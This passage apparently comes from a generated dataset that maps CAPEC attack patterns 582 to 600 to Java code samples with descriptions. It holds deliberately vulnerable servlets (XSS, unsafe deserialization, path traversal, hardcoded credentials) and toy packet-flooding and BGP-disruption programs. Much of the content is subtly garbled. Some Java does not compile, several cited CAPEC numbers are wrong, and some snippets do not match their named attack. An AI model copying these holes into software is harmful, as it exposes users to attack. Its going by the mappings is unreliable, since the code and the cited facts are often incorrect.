        "capec_id": "582",
        "capec_name": "Route Disabling",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class RouteDisablingExample {\n    private static final String TARGET_IP = \"192.168.1.100\";\n    private static final int TARGET_PORT = 8080;\n\n    public static void main(String[] args) {\n        try {\n            // Attempt to establish a connection to the target\n            Socket socket = new Socket(TARGET_IP, TARGET_PORT);\n            System.out.println(\"Connection established to \" + TARGET_IP + \":\" + TARGET_PORT);\n\n            // Simulate route disabling by closing the socket\n            socket.close();\n            System.out.println(\"Route disabled: Connection closed.\");\n        } catch (UnknownHostException e) {\n            System.err.println(\"Unknown host: \" + TARGET_IP);\n        } catch (IOException e) {\n            System.err.println(\"I/O error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Route Disabling' by attempting to establish a network connection to a target IP and port, and then immediately closing the connection to simulate the severing of the communication channel. This represents the CAPEC idea of disabling the network route between two targets. The code also touches on related CWEs: it does not ensure message integrity (CWE-924), does not verify the endpoint (CWE-923), and could be susceptible to race conditions (CWE-421) if the connection handling were more complex."
    },
    {
        "capec_id": "583",
        "capec_name": "Disabling Network Hardware",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\n\npublic class NetworkDisabler {\n    private static final String TARGET_IP = \"192.168.1.1\";\n    private static final int TARGET_PORT = 80;\n\n    public static void main(String[] args) {\n        try {\n            // Attempt to disable network hardware by sending malformed packets\n            disableNetworkHardware(TARGET_IP, TARGET_PORT);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void disableNetworkHardware(String ip, int port) throws IOException {\n        InetAddress address = InetAddress.getByName(ip);\n        try (Socket socket = new Socket(address, port)) {\n            // Injecting errors to degrade hardware redundancy (CWE-1334)\n            socket.getOutputStream().write(new byte[]{0x00, 0x00, 0x00, 0x00});\n            // Improperly preserving integrity of hardware configuration state (CWE-1304)\n            socket.getOutputStream().write(new byte[]{0xFF, 0xFF, 0xFF, 0xFF});\n            // Improper restriction of software interfaces to hardware features (CWE-1256)\n            socket.getOutputStream().write(new byte[]{0x01, 0x02, 0x03, 0x04});\n            // Improper protection for outbound error messages and alert signals (CWE-1320)\n            socket.getOutputStream().write(new byte[]{0x05, 0x06, 0x07, 0x08});\n            // Hardware child block incorrectly connected to parent system (CWE-1276)\n            socket.getOutputStream().write(new byte[]{0x09, 0x0A, 0x0B, 0x0C});\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an attack pattern where an adversary attempts to disable network hardware by sending malformed packets to a target IP and port. The code embodies the main idea of CAPEC-Disabling Network Hardware by simulating the injection of errors and improper handling of hardware configuration states. Each write operation to the socket's output stream represents a different CWE related to the attack pattern, such as injecting errors to degrade hardware redundancy (CWE-1334) and improperly preserving the integrity of hardware configuration state (CWE-1304). The code aims to disrupt the normal operation of the network hardware, potentially causing it to shut down or malfunction."
    },
    {
        "capec_id": "584",
        "capec_name": "BGP Route Disabling",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class BGPRouteDisabling {\n    public static void main(String[] args) {\n        try {\n            // Incorrectly specified destination (CWE-941)\n            String targetAS = \"192.0.2.1\"; // Incorrect AS IP\n            Socket socket = new Socket(targetAS, 179); // BGP typically uses port 179\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n            // Sending a malformed BGP update to suppress route (CWE-924)\n            String bgpUpdate = \"\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\x00\\x13\\x02\\x00\\x00\\x00\\x00\";\n            out.println(bgpUpdate);\n\n            // Insufficient control of network message volume (CWE-406)\n            for (int i = 0; i < 1000; i++) {\n                out.println(bgpUpdate);\n            }\n\n            // Close the connection\n            in.close();\n            out.close();\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a BGP Route Disabling attack. The code attempts to connect to a target Autonomous System (AS) using an incorrectly specified destination IP address (CWE-941). It then sends a malformed BGP update message to suppress the route (CWE-924). Additionally, it sends the malformed message multiple times to simulate insufficient control of network message volume (CWE-406). The main idea is to disrupt the BGP routing by suppressing route advertisements, making the target network inaccessible."
    },
    {
        "capec_id": "585",
        "capec_name": "DNS Domain Seizure",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class DNSDomainSeizureExample {\n    private static Map<String, Boolean> trustedDomains = new HashMap<>();\n\n    static {\n        // Permissive cross-domain policy\n        trustedDomains.put(\"trusted.com\", true);\n        trustedDomains.put(\"untrusted.com\", true); // CWE-942\n    }\n\n    public static void main(String[] args) {\n        String userInputDomain = \"example.com\"; // This could be user-controlled input\n        try {\n            InetAddress inetAddress = InetAddress.getByName(userInputDomain);\n            String hostname = inetAddress.getHostName();\n\n            // Reverse DNS resolution for security-critical action\n            if (trustedDomains.containsKey(hostname)) { // CWE-350\n                System.out.println(\"Domain is trusted: \" + hostname);\n            } else {\n                System.out.println(\"Domain is not trusted: \" + hostname);\n            }\n\n            // URL redirection based on user input\n            String redirectUrl = \"http://\" + userInputDomain; // CWE-601\n            System.out.println(\"Redirecting to: \" + redirectUrl);\n\n        } catch (UnknownHostException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary could influence a target's web-hosting company to disable a target domain, representing the main idea of the CAPEC 'DNS Domain Seizure'. The code includes several related CWEs for additional context:\n\n1. CWE-350: The code performs reverse DNS resolution on a user-controlled domain to make a security decision, but it does not ensure that the IP address is truly associated with the hostname.\n2. CWE-942: The code uses a permissive cross-domain policy that includes untrusted domains.\n3. CWE-601: The code accepts user-controlled input for a domain and uses it in a URL redirection, which could lead to phishing attacks.\n\nThe code attempts to check if a domain is trusted based on a reverse DNS lookup and then redirects to the user-controlled domain, demonstrating potential vulnerabilities in handling domain trust and redirection."
    },
    {
        "capec_id": "586",
        "capec_name": "Object Injection",
        "code_snippet": "import java.io.*;\n\nclass SensitiveData implements Serializable {\n    private static final long serialVersionUID = 1L;\n    private String secret;\n\n    public SensitiveData(String secret) {\n        this.secret = secret;\n    }\n\n    public String getSecret() {\n        return secret;\n    }\n}\n\npublic class VulnerableDeserialization {\n    public static void main(String[] args) {\n        try {\n            // Simulate receiving serialized data from an untrusted source\n            byte[] serializedData = getSerializedDataFromUntrustedSource();\n            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(serializedData));\n            SensitiveData data = (SensitiveData) ois.readObject();\n            System.out.println(\"Deserialized secret: \" + data.getSecret());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static byte[] getSerializedDataFromUntrustedSource() {\n        // This method simulates an attacker providing a malicious serialized object\n        try {\n            ByteArrayOutputStream baos = new ByteArrayOutputStream();\n            ObjectOutputStream oos = new ObjectOutputStream(baos);\n            oos.writeObject(new SensitiveData(\"malicious data\"));\n            return baos.toByteArray();\n        } catch (IOException e) {\n            e.printStackTrace();\n            return new byte[0];\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to object injection and deserialization of untrusted data. The `SensitiveData` class contains sensitive information and implements `Serializable`. The `VulnerableDeserialization` class simulates receiving serialized data from an untrusted source, deserializing it, and then accessing the sensitive data. The `getSerializedDataFromUntrustedSource` method simulates an attacker providing a malicious serialized object. This code is vulnerable to deserialization attacks, where an attacker can inject malicious objects to manipulate the application's behavior, potentially leading to remote code execution or leakage of sensitive data. This example embodies the main idea of CAPEC-74 (Object Injection) and CWE-502 (Deserialization of Untrusted Data), highlighting the risks of deserializing data from untrusted sources without proper validation."
    },
    {
        "capec_id": "587",
        "capec_name": "Cross Frame Scripting (XFS)",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userContent = request.getParameter(\"content\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<iframe src='https://legitimate-site.com' style='display:none;'></iframe>\");\n        response.getWriter().println(\"<script>\");\n        response.getWriter().println(\"var iframe = document.querySelector('iframe');\");\n        response.getWriter().println(\"iframe.onload = function() {\");\n        response.getWriter().println(\"  var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;\");\n        response.getWriter().println(\"  iframeDoc.body.innerHTML += '\" + userContent + \"';\");\n        response.getWriter().println(\"};\");\n        response.getWriter().println(\"</script>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a Cross Frame Scripting (XFS) attack. The servlet takes user input from a request parameter and injects it into a hidden iframe that loads a legitimate site. The malicious JavaScript interacts with the iframe's content, potentially leading to security issues such as Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF). The code does not properly neutralize user input, making it vulnerable to XSS (CWE-79, CWE-82, CWE-692), and it does not restrict iframe interactions (CWE-1021), which can confuse users about the source of the content they are interacting with."
    },
    {
        "capec_id": "588",
        "capec_name": "DOM-Based XSS",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        \n        // Vulnerable code: directly inserting user input into the DOM without validation or encoding\n        String htmlResponse = \"<html><body>\" +\n                             \"<h1>Welcome!</h1>\" +\n                             \"<div id='userInput'>\" + userInput + \"</div>\" +\n                             \"<script>document.getElementById('userInput').innerHTML = '\" + userInput + \"';</script>\" +\n                             \"</body></html>\";\n        \n        response.setContentType(\"text/html\");\n        response.getWriter().write(htmlResponse);\n    }\n}",
        "description": "This Java servlet code demonstrates a DOM-Based XSS vulnerability. The servlet takes user input from an HTTP GET request parameter named 'input' and directly inserts it into the HTML response without any validation or encoding. This allows an attacker to inject malicious scripts into the 'userInput' div and the script tag, which will be executed by the browser when the page is loaded. This code snippet embodies the main idea of CAPEC-63 (DOM-Based XSS) and highlights related CWEs such as CWE-79 (Improper Neutralization of Input During Web Page Generation) and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "589",
        "capec_name": "DNS Blocking",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class DNSBlockingExample {\n    public static void main(String[] args) {\n        try {\n            // Vulnerable code: Binding to an unrestricted IP address\n            ServerSocket serverSocket = new ServerSocket(53, 0, InetAddress.getByName(\"0.0.0.0\"));\n            System.out.println(\"DNS Server started on port 53\");\n\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n                String request = in.readLine();\n\n                // Vulnerable code: Reliance on IP address for authentication\n                String clientIP = clientSocket.getInetAddress().getHostAddress();\n                if (isBlocked(clientIP)) {\n                    System.out.println(\"Blocking DNS request from: \" + clientIP);\n                    clientSocket.close();\n                    continue;\n                }\n\n                // Process DNS request (simplified)\n                System.out.println(\"Processing DNS request: \" + request);\n                // ... DNS request handling logic ...\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static boolean isBlocked(String ip) {\n        // Vulnerable code: Reliance on reverse DNS resolution for a security-critical action\n        try {\n            String hostname = InetAddress.getByName(ip).getHostName();\n            return hostname.endsWith(\"blocked-domain.com\");\n        } catch (UnknownHostException e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a DNS server that is vulnerable to DNS blocking attacks. The server binds to an unrestricted IP address (0.0.0.0), making it accessible from any network interface. It listens for incoming DNS requests on port 53. When a request is received, the server checks the client's IP address to determine if it should block the request. This check relies on the client's IP address for authentication and uses reverse DNS resolution to make a security decision. These practices are insecure and can be exploited by an adversary to intercept and block DNS requests, denying access to specific services or content."
    },
    {
        "capec_id": "590",
        "capec_name": "IP Address Blocking",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class VulnerableServer {\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(0)) { // CWE-1327: Binding to an Unrestricted IP Address\n            System.out.println(\"Server started on port: \" + serverSocket.getLocalPort());\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                String clientIP = clientSocket.getInetAddress().getHostAddress();\n                if (isBlockedIP(clientIP)) { // CAPEC: IP Address Blocking\n                    System.out.println(\"Blocked IP: \" + clientIP);\n                    clientSocket.close();\n                } else {\n                    // Handle client connection\n                    System.out.println(\"Accepted connection from: \" + clientIP);\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static boolean isBlockedIP(String ip) {\n        // CWE-291: Reliance on IP Address for Authentication\n        // Example of blocked IPs\n        return \"192.168.1.100\".equals(ip) || \"10.0.0.1\".equals(ip);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable server that listens on an unrestricted IP address (0.0.0.0), which is a common issue described in CWE-1327. The server accepts incoming connections and checks the client's IP address against a list of blocked IPs, embodying the main idea of CAPEC's IP Address Blocking attack. The reliance on IP address for blocking (CWE-291) is a weak form of authentication and can be easily bypassed or spoofed. The code highlights the vulnerability of using IP-based mechanisms for security purposes, which can lead to denial of service or unauthorized access."
    },
    {
        "capec_id": "591",
        "capec_name": "Reflected XSS",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class ReflectedXSSExample extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<h1>Welcome, \" + userInput + \"</h1>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a Reflected Cross-Site Scripting (XSS) vulnerability. The servlet takes a user input from the HTTP request parameter 'input' and directly includes it in the HTML response without any sanitization or encoding. This allows an attacker to inject malicious scripts into the input parameter, which will then be reflected back to the victim's browser and executed. This example embodies CWE-79 (Improper Neutralization of Input During Web Page Generation) as it fails to neutralize user input before including it in the web page output. The code snippet is concise and represents the main idea of a Reflected XSS attack as described in the CAPEC."
    },
    {
        "capec_id": "592",
        "capec_name": "Stored XSS",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.PrintWriter;\n\n@WebServlet(\"/storeComment\")\npublic class StoreCommentServlet extends HttpServlet {\n    private static final long serialVersionUID = 1L;\n\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String comment = request.getParameter(\"comment\");\n        // Simulate storing the comment in a database (in reality, you would use a database connection here)\n        // For demonstration, we will just store it in a static variable\n        Database.storeComment(comment);\n        response.setContentType(\"text/html\");\n        PrintWriter out = response.getWriter();\n        out.println(\"<html><body>\");\n        out.println(\"<h2>Comment stored successfully!</h2>\");\n        out.println(\"<a href='viewComments'>View Comments</a>\");\n        out.println(\"</body></html>\");\n    }\n}\n\nclass Database {\n    private static String storedComment;\n\n    public static void storeComment(String comment) {\n        storedComment = comment;\n    }\n\n    public static String getStoredComment() {\n        return storedComment;\n    }\n}\n\n@WebServlet(\"/viewComments\")\npublic class ViewCommentsServlet extends HttpServlet {\n    private static final long serialVersionUID = 1L;\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        response.setContentType(\"text/html\");\n        PrintWriter out = response.getWriter();\n        out.println(\"<html><body>\");\n        out.println(\"<h2>Stored Comments:</h2>\");\n        // Directly outputting the stored comment without any sanitization\n        out.println(\"<p>\" + Database.getStoredComment() + \"</p>\");\n        out.println(\"</body></html>\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable web application that is susceptible to Stored Cross-Site Scripting (XSS) attacks. The application consists of two servlets: `StoreCommentServlet` and `ViewCommentsServlet`. The `StoreCommentServlet` accepts user input via a POST request and stores it in a simulated database. The `ViewCommentsServlet` retrieves and displays the stored comment without any sanitization. This lack of input neutralization allows an attacker to store malicious scripts in the comment, which will be executed when other users view the comments. This example embodies the main idea of CAPEC-63 (Stored XSS) and highlights related CWEs such as CWE-79 (Improper Neutralization of Input During Web Page Generation) and CWE-692 (Incomplete Denylist to Cross-Site Scripting)."
    },
    {
        "capec_id": "593",
        "capec_name": "Session Hijacking",
        "code_snippet": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\nimport java.io.IOException;\n\npublic class VulnerableSessionServlet extends HttpServlet {\n    @Override\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String username = request.getParameter(\"username\");\n        String password = request.getParameter(\"password\");\n\n        // Simulate authentication (Improper Authentication - CWE-287)\n        if (\"admin\".equals(username) && \"password123\".equals(password)) {\n            HttpSession session = request.getSession();\n            session.setAttribute(\"user\", username);\n            response.getWriter().println(\"Authenticated as \" + username);\n        } else {\n            response.getWriter().println(\"Authentication failed\");\n        }\n    }\n\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        HttpSession session = request.getSession(false);\n        if (session != null && session.getAttribute(\"user\") != null) {\n            response.getWriter().println(\"Welcome back, \" + session.getAttribute(\"user\"));\n        } else {\n            response.getWriter().println(\"Please log in\");\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerable implementation of session management, embodying the concept of Session Hijacking (CAPEC-288). The code contains several weaknesses: \n1. Improper Authentication (CWE-287): The authentication mechanism is overly simplistic and does not securely verify user credentials.\n2. Session Fixation (CWE-384): The code does not invalidate any existing session identifier upon authentication, allowing an attacker to hijack the session.\n3. Insufficient Session Expiration (CWE-613): The session is not configured to expire, which could allow an attacker to reuse old session credentials.\n4. J2EE Misconfiguration: Insufficient Session-ID Length (CWE-6): Although not explicitly shown in the code, the default session ID length might be insufficient, making it easier for an attacker to guess or brute-force session IDs.\n5. Client-Side Enforcement of Server-Side Security (CWE-602): The code relies on the client to maintain the session state without additional server-side validation, making it vulnerable to manipulation."
    },
    {
        "capec_id": "594",
        "capec_name": "Traffic Injection",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableServer {\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(8080)) {\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                handleClient(clientSocket);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void handleClient(Socket clientSocket) {\n        try (BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n             PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true)) {\n\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                // CWE-319: Cleartext Transmission of Sensitive Information\n                System.out.println(\"Received: \" + inputLine);\n                // CWE-924: No integrity check on the received message\n                out.println(\"Echo: \" + inputLine);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a simple server that listens for incoming connections on port 8080 and echoes back any received messages. The code embodies the main idea of CAPEC-152 (Traffic Injection) by demonstrating how an adversary could inject traffic into the network connection. The server does not verify the source of the communication channel (CWE-940), does not enforce message integrity (CWE-924), and transmits data in cleartext (CWE-319). This makes it vulnerable to traffic injection attacks, where an adversary could degrade, disrupt, or modify the connection."
    },
    {
        "capec_id": "595",
        "capec_name": "Connection Reset",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class VulnerableServer {\n    private static final int PORT = 8080;\n    private static final ExecutorService threadPool = Executors.newFixedThreadPool(10);\n\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(PORT)) {\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                threadPool.submit(() -> handleClient(clientSocket));\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void handleClient(Socket clientSocket) {\n        try {\n            // Simulate handling client connection\n            System.out.println(\"Handling client: \" + clientSocket.getInetAddress());\n            // Vulnerable to connection reset attack\n            if (Math.random() < 0.5) { // Simulate random connection reset\n                clientSocket.setSoLinger(true, 0); // Forcefully close the connection\n                clientSocket.close();\n                System.out.println(\"Connection reset by attacker\");\n            }\n        } catch (SocketException e) {\n            System.out.println(\"SocketException: \" + e.getMessage());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a simple server that listens for incoming connections on port 8080. The server uses a thread pool to handle multiple client connections concurrently. The `handleClient` method simulates handling a client connection and includes a vulnerability where the connection can be forcefully reset by an attacker. This is demonstrated by the random condition that sets the socket's linger option to 0 and closes the connection, mimicking a connection reset attack. The code embodies the main idea of the CAPEC 'Connection Reset' by showing how an attacker can disrupt a connection. The related CWEs are represented by the lack of proper verification of the communication channel's source (CWE-940), insufficient message integrity checks (CWE-924), and the potential for multiple binds to the same port (CWE-605)."
    },
    {
        "capec_id": "596",
        "capec_name": "TCP RST Injection",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.io.OutputStream;\n\npublic class TCPRSTInjectionExample {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server is listening on port 8080\");\n\n        while (true) {\n            Socket socket = serverSocket.accept();\n            System.out.println(\"Client connected\");\n\n            // Simulate a TCP RST injection\n            injectTCPRST(socket);\n        }\n    }\n\n    private static void injectTCPRST(Socket socket) throws IOException {\n        OutputStream out = socket.getOutputStream();\n        byte[] rstPacket = createRSTPacket();\n        out.write(rstPacket);\n        out.flush();\n        socket.close();\n        System.out.println(\"Injected TCP RST packet and closed connection\");\n    }\n\n    private static byte[] createRSTPacket() {\n        // Simplified RST packet creation (not a real RST packet)\n        return new byte[]{0x00, 0x00, 0x00, 0x00};\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified example of a TCP RST injection attack. The server listens on port 8080 and accepts incoming connections. Upon accepting a connection, it simulates the injection of a TCP RST packet, which forces the termination of the TCP connection. This represents the main idea of CAPEC-297 (TCP RST Injection), where an adversary injects TCP RST packets to disrupt an established connection. The code also touches on CWE-940 (Improper Verification of Source of a Communication Channel) by not verifying the source of the incoming connection, making it vulnerable to such attacks."
    },
    {
        "capec_id": "597",
        "capec_name": "Absolute Path Traversal",
        "code_snippet": "import java.io.*;\n\npublic class PathTraversalExample {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java PathTraversalExample <filename>\");\n            return;\n        }\n\n        String filename = args[0];\n        File file = new File(\"/restricted/directory/\" + filename);\n\n        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability to Absolute Path Traversal. The program takes a filename as a command-line argument and attempts to read and print the contents of the file located in the '/restricted/directory/' directory. However, it does not properly validate or sanitize the input filename, allowing an attacker to use sequences like '../' to traverse directories and access files outside the intended restricted directory. This embodies the main idea of the CAPEC and related CWEs, where improper handling of file paths can lead to unauthorized access to the filesystem."
    },
    {
        "capec_id": "598",
        "capec_name": "DNS Spoofing",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class DnsSpoofingExample {\n    public static void main(String[] args) {\n        try {\n            // CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\n            InetAddress addr = InetAddress.getByName(\"example.com\");\n            String hostname = addr.getHostName();\n            System.out.println(\"Resolved hostname: \" + hostname);\n\n            // CWE-941: Incorrectly Specified Destination in a Communication Channel\n            URL url = new URL(\"http://\" + hostname + \"/data\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n\n            // CWE-494: Download of Code Without Integrity Check\n            InputStream is = conn.getInputStream();\n            BufferedReader br = new BufferedReader(new InputStreamReader(is));\n            String line;\n            while ((line = br.readLine()) != null) {\n                System.out.println(line);\n            }\n            br.close();\n\n            // CWE-601: URL Redirection to Untrusted Site\n            String redirectUrl = \"http://untrusted.com\";\n            System.out.println(\"Redirecting to: \" + redirectUrl);\n            // Simulate redirection\n            URL redirect = new URL(redirectUrl);\n            HttpURLConnection redirectConn = (HttpURLConnection) redirect.openConnection();\n            redirectConn.setRequestMethod(\"GET\");\n            InputStream redirectIs = redirectConn.getInputStream();\n            BufferedReader redirectBr = new BufferedReader(new InputStreamReader(redirectIs));\n            while ((line = redirectBr.readLine()) != null) {\n                System.out.println(line);\n            }\n            redirectBr.close();\n\n            // CWE-918: Server-Side Request Forgery (SSRF)\n            String ssrfUrl = \"http://localhost/admin\";\n            System.out.println(\"Fetching internal resource: \" + ssrfUrl);\n            URL ssrf = new URL(ssrfUrl);\n            HttpURLConnection ssrfConn = (HttpURLConnection) ssrf.openConnection();\n            ssrfConn.setRequestMethod(\"GET\");\n            InputStream ssrfIs = ssrfConn.getInputStream();\n            BufferedReader ssrfBr = new BufferedReader(new InputStreamReader(ssrfIs));\n            while ((line = ssrfBr.readLine()) != null) {\n                System.out.println(line);\n            }\n            ssrfBr.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where DNS spoofing can be exploited, incorporating several related CWEs. The code performs the following actions:\n\n1. **CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action** - The code resolves the hostname for 'example.com' and uses it for further actions without verifying the integrity of the DNS response.\n\n2. **CWE-941: Incorrectly Specified Destination in a Communication Channel** - The code constructs a URL using the resolved hostname and initiates a connection, potentially to an unintended destination if the DNS response was spoofed.\n\n3. **CWE-494: Download of Code Without Integrity Check** - The code downloads data from the constructed URL without verifying its integrity, which could lead to executing malicious code.\n\n4. **CWE-601: URL Redirection to Untrusted Site** - The code simulates a redirection to an untrusted site, which could facilitate phishing attacks.\n\n5. **CWE-918: Server-Side Request Forgery (SSRF)** - The code fetches an internal resource using a URL, potentially allowing an attacker to access internal services.\n\nThis snippet highlights how DNS spoofing can be used to manipulate network communications and exploit various vulnerabilities in a system."
    },
    {
        "capec_id": "599",
        "capec_name": "Terrestrial Jamming",
        "code_snippet": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class SatelliteCommunication {\n    private static final String SERVER_IP = \"192.168.1.100\";\n    private static final int SERVER_PORT = 9876;\n\n    public static void main(String[] args) {\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            String message = \"Sensitive Data: User Credentials\";\n            byte[] buffer = message.getBytes();\n            InetAddress serverAddress = InetAddress.getByName(SERVER_IP);\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, serverAddress, SERVER_PORT);\n            socket.send(packet);\n            System.out.println(\"Message sent: \" + message);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic UDP communication where sensitive data is transmitted in cleartext. The code sets up a DatagramSocket to send a message containing sensitive information (user credentials) to a specified server IP and port. This example embodies the CAPEC of 'Terrestrial Jamming' by illustrating a scenario where an adversary could disrupt or intercept the communication due to the lack of proper security measures. The related CWEs are represented as follows:\n- CWE-319: The sensitive data is transmitted in cleartext, making it vulnerable to interception.\n- CWE-923: The code does not verify the endpoint, potentially allowing communication with an unintended recipient.\n- CWE-924: There is no integrity check to ensure the message was not modified during transmission."
    },
    {
        "capec_id": "600",
        "capec_name": "Credential Stuffing",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class CredentialStuffingExample {\n    private static Map<String, String> userDatabase = new HashMap<>();\n    private static Map<String, Integer> loginAttempts = new HashMap<>();\n    private static final int MAX_ATTEMPTS = 5;\n\n    public static void main(String[] args) {\n        // Example user credentials\n        userDatabase.put(\"user1\", \"password123\");\n        userDatabase.put(\"user2\", \"password456\");\n\n        // Simulate login attempts\n        System.out.println(login(\"user1\", \"password123\")); // Successful login\n        System.out.println(login(\"user1\", \"wrongpassword\")); // Failed login\n        System.out.println(login(\"user1\", \"wrongpassword\")); // Failed login\n        System.out.println(login(\"user1\", \"wrongpassword\")); // Failed login\n        System.out.println(login(\"user1\", \"wrongpassword\")); // Failed login\n        System.out.println(login(\"user1\", \"wrongpassword\")); // Account locked\n    }\n\n    public static String login(String username, String password) {\n        if (!userDatabase.containsKey(username)) {\n            return \"User not found\";\n        }\n\n        if (loginAttempts.getOrDefault(username, 0) >= MAX_ATTEMPTS) {\n            return \"Account locked due to too many failed attempts\";\n        }\n\n        if (userDatabase.get(username).equals(password)) {\n            loginAttempts.put(username, 0); // Reset attempts on successful login\n            return \"Login successful\";\n        } else {\n            loginAttempts.put(username, loginAttempts.getOrDefault(username, 0) + 1);\n            return \"Invalid credentials\";\n        }\n    }\n}",
